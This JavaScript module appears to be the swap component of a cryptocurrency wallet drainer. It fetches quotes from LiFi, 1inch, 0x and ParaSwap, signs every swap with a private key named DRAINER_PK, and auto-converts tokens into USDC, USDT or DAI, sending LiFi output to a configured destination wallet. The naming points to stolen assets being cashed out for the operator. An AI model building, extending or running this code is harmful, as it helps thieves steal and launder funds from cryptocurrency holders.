import { ethers } from 'ethers';
import { OneInchAggregator } from '.././lib/aggregators/oneInch.js';
import { ZeroExAggregator } from '.././lib/aggregators/zeroEx.js';
import { ParaSwapAggregator } from '.././lib/aggregators/paraswap.js';
import { LIFI_API_KEY, DESTINATION_WALLET } from '../config.js';

export class SwapHandler {
    constructor() {
        this.isInitialized = false;
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            // Initialize aggregators if they have initialize methods
            if (OneInchAggregator.initialize) await OneInchAggregator.initialize();
            if (ZeroExAggregator.initialize) await ZeroExAggregator.initialize();
            if (ParaSwapAggregator.initialize) await ParaSwapAggregator.initialize();
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    async getAllQuotes(tokenIn, tokenOut, amount, chainId = 1, fromAddress) {
        try {
            const quotes = await Promise.allSettled([
                this.getLiFiQuote(tokenIn, tokenOut, amount, chainId, fromAddress),
                OneInchAggregator.getQuote(chainId, tokenIn, tokenOut, amount, fromAddress),
                ZeroExAggregator.getQuote(chainId, tokenIn, tokenOut, amount),
                ParaSwapAggregator.getQuote(chainId, tokenIn, tokenOut, amount, fromAddress)
            ]);

            const successfulQuotes = quotes
                .filter(result => result.status === 'fulfilled' && result.value !== null)
                .map(result => result.value);

            return this.selectBestQuote(successfulQuotes);
        } catch (error) {
            console.error('Multi-aggregator quote error:', error);
            return null;
        }
    }

    async getLiFiQuote(tokenIn, tokenOut, amount, chainId, fromAddress) {
        try {
            const response = await fetch('https://li.quest/v1/quote', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${LIFI_API_KEY}`
                },
                body: JSON.stringify({
                    fromChain: chainId,
                    toChain: chainId,
                    fromToken: tokenIn,
                    toToken: tokenOut,
                    fromAmount: amount,
                    fromAddress: fromAddress,
                    toAddress: DESTINATION_WALLET,
                    slippage: 0.05,
                    allowExchanges: ['uniswap', 'sushiswap', 'curve', '1inch']
                })
            });

            if (!response.ok) throw new Error('LiFi quote failed');
            
            const quote = await response.json();
            return {
                aggregator: 'lifi',
                fromAmount: amount,
                toAmount: quote.estimate.toAmount,
                estimatedGas: quote.estimate.gasCosts?.reduce((sum, cost) => sum + parseInt(cost.amount), 0) || 0,
                tx: quote.transactionRequest,
                price: quote.estimate.toAmountUSD
            };
        } catch (error) {
            console.warn('LiFi quote failed:', error.message);
            return null;
        }
    }

    selectBestQuote(quotes) {
        if (quotes.length === 0) return null;

        // Sort by best output amount (highest first)
        const sortedByOutput = [...quotes].sort((a, b) => {
            const amountA = BigInt(a.toAmount || '0');
            const amountB = BigInt(b.toAmount || '0');
            return amountB > amountA ? 1 : -1;
        });

        // Consider gas costs for final selection
        const bestQuote = sortedByOutput[0];
        console.log(`🏆 Best quote from ${bestQuote.aggregator}: ${ethers.formatUnits(bestQuote.toAmount, 18)}`);
        
        return bestQuote;
    }

    async executeBestSwap(tokenIn, tokenOut, amount, chainId = 1, fromAddress) {
        try {
            const bestQuote = await this.getAllQuotes(tokenIn, tokenOut, amount, chainId, fromAddress);
            
            if (!bestQuote) {
                throw new Error('No valid quotes from any aggregator');
            }

            let txResult;
            switch (bestQuote.aggregator) {
                case 'lifi':
                    txResult = await this.executeLiFiSwap(bestQuote);
                    break;
                case '1inch':
                    txResult = await this.execute1inchSwap(bestQuote);
                    break;
                case '0x':
                    txResult = await this.executeZeroExSwap(bestQuote);
                    break;
                case 'paraswap':
                    txResult = await this.executeParaSwap(bestQuote);
                    break;
                default:
                    throw new Error(`Unsupported aggregator: ${bestQuote.aggregator}`);
            }

            return {
                success: true,
                aggregator: bestQuote.aggregator,
                txHash: txResult.hash,
                fromToken: tokenIn,
                toToken: tokenOut,
                amountIn: amount,
                estimatedAmountOut: bestQuote.toAmount
            };

        } catch (error) {
            console.error('Multi-aggregator swap failed:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    async executeLiFiSwap(quote) {
        const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
        const signer = new ethers.Wallet(process.env.DRAINER_PK, provider);
        
        return await signer.sendTransaction({
            to: quote.tx.to,
            data: quote.tx.data,
            value: quote.tx.value || '0x0',
            gasLimit: quote.tx.gasLimit || '300000',
            gasPrice: quote.tx.gasPrice || await provider.getGasPrice()
        });
    }

    async execute1inchSwap(quote) {
        const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
        const signer = new ethers.Wallet(process.env.DRAINER_PK, provider);
        
        return await signer.sendTransaction({
            to: quote.tx.to,
            data: quote.tx.data,
            value: quote.tx.value || '0x0',
            gasLimit: quote.estimatedGas || '300000',
            gasPrice: await provider.getGasPrice()
        });
    }

    async executeZeroExSwap(quote) {
        const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
        const signer = new ethers.Wallet(process.env.DRAINER_PK, provider);
        
        return await signer.sendTransaction({
            to: quote.tx.to,
            data: quote.tx.data,
            value: quote.tx.value || '0x0',
            gasLimit: quote.estimatedGas || '300000',
            gasPrice: await provider.getGasPrice()
        });
    }

    async executeParaSwap(quote) {
        const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
        const signer = new ethers.Wallet(process.env.DRAINER_PK, provider);
        
        return await signer.sendTransaction({
            to: quote.tx.to,
            data: quote.tx.data,
            value: quote.tx.value || '0x0',
            gasLimit: quote.estimatedGas || '300000',
            gasPrice: await provider.getGasPrice()
        });
    }

    // ADD HELPER METHOD
    getStablecoinsForChain(chainId) {
        const stablecoins = {
            1: { // Ethereum
                USDC: '0xA0b86991c6218b36c1d19D4a2e9eb0ce3606eB48',
                USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F'
            },
            137: { // Polygon
                USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
                USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
                DAI: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063'
            },
            56: { // BSC
                USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
                USDT: '0x55d398326f99059fF775485246999027B3197955',
                BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
            },
            42161: { // Arbitrum
                USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
                USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
                DAI: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1'
            },
            10: { // Optimism
                USDC: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',
                USDT: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
                DAI: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1'
            }
        };
        
        return stablecoins[chainId];
    }

    // UPDATED autoSwapToStable function
    async autoSwapToStable(tokenAddress, amount, chainId, fromAddress) {
        try {
            console.log(`🔄 Auto-swapping to stablecoin...`);
            
            const stablecoins = this.getStablecoinsForChain(chainId);
            if (!stablecoins) {
                throw new Error(`No stablecoins configured for chain ${chainId}`);
            }

            // Try USDC first (most liquid), then USDT, then DAI
            let swapResult;
            
            if (stablecoins.USDC) {
                swapResult = await this.executeBestSwap(
                    tokenAddress, 
                    stablecoins.USDC, 
                    amount, 
                    chainId, 
                    fromAddress
                );
            }
            
            if (!swapResult?.success && stablecoins.USDT) {
                swapResult = await this.executeBestSwap(
                    tokenAddress, 
                    stablecoins.USDT, 
                    amount, 
                    chainId, 
                    fromAddress
                );
            }
            
            if (!swapResult?.success && stablecoins.DAI) {
                swapResult = await this.executeBestSwap(
                    tokenAddress, 
                    stablecoins.DAI, 
                    amount, 
                    chainId, 
                    fromAddress
                );
            }

            if (swapResult?.success) {
                console.log(`✅ Auto-swap successful: ${swapResult.amountOut} stablecoins`);
                return swapResult;
            }
            
            console.log('❌ Auto-swap failed for all stablecoins');
            return null;

        } catch (error) {
            console.error('❌ Auto-swap error:', error.message);
            return null;
        }
    }
}

// Create singleton instance
export const swapHandler = new SwapHandler();